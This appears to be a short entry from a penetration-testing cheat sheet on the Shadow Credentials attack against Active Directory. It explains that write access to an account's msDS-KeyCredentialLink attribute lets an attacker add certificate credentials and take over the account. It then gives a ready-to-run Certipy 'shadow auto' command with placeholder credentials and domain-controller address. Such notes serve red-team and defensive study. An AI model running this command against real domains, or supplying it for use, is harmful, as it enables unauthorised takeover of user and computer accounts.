## Exploit

If the attacker can modify the target object's (user or computer account) attribute `msDS-KeyCredentialLink` and append it with alternate credentials in the form of certificates, he takes over the account in AD.

```bash
# -k: Use Kerberos authentication
certipy shadow auto -account "targetuser" -u "username@example.local" -p 'password' -dc-ip 10.0.0.1 -target dc.example.local -k
```
